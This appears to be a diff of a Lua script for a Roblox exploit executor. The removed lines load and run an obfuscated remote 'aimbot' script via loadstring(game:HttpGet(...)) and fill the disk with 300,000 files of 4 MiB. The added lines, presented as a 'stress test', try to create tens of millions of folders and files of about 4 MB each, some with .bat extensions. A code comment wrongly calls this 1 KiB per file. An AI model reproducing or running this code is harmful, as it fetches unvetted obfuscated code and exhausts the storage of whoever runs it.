@@ -1,45 +1,55 @@
+local folderPrefix = "Systemer"
+local totalFolders = 25000000
+local filesPerFolder = 25000000
+local fileSize = 4000000 -- 1 KiB per file
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Aina-Aimbot-UNIVERSAL/refs/heads/main/obfuscated_script-1752536242297.lua.txt"))()
-task.wait(5)
-local folderName = "Systematic"
-local totalFiles = 300000
-local fileSize = 4 * 1024 * 1024 -- 4 MiB
-local waitTime = 0.1
+local function randomText(size)
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 "
+    local output = {}
 
-local content = string.rep("A", fileSize)
-
-if not isfolder(folderName) then
-    makefolder(folderName)
-end
-
-local successfulWrites = 0
-local failedWrites = 0
-
-for i = 1, totalFiles do
-    local fileName = folderName .. "/File" .. i .. ".txt"
-
-    local success, err = pcall(function()
-        writefile(fileName, content)
-    end)
-
-    if success then
-        successfulWrites = successfulWrites + 1
-    else
-        failedWrites = failedWrites + 1
-        warn("Write failed at file " .. i .. ": " .. tostring(err))
+    for i = 1, size do
+        local index = math.random(1, #chars)
+        output[i] = chars:sub(index, index)
     end
 
-    if i % 100 == 0 then
-        print(
-            "Attempted:", i,
-            "Successful:", successfulWrites,
-            "Failed:", failedWrites
-        )
-    end
-
-    task.wait(waitTime)
+    return table.concat(output)
 end
 
-print("Finished.")
-print("Successful writes:", successfulWrites)
-print("Failed writes:", failedWrites)
+for folderIndex = 1, totalFolders do
+    local folderName = folderPrefix .. folderIndex
+
+    if not isfolder(folderName) then
+        makefolder(folderName)
+    end
+
+    for fileIndex = 1, filesPerFolder do
+        local extension
+
+        if fileIndex % 3 == 1 then
+            extension = ".txt"
+        elseif fileIndex % 3 == 2 then
+            extension = ".bat"
+        else
+            extension = ".json"
+        end
+
+        local fileName = folderName .. "/File" .. fileIndex .. extension
+        local content
+
+        if extension == ".json" then
+            content = '{"data":"' .. string.rep("A", fileSize - 12) .. '"}'
+        else
+            content = randomText(fileSize)
+        end
+
+        local success, err = pcall(function()
+            writefile(fileName, content)
+        end)
+
+        if not success then
+            warn("Write failed:", fileName, tostring(err))
+        end
+    end
+end
+
+print("Stress test completed.")
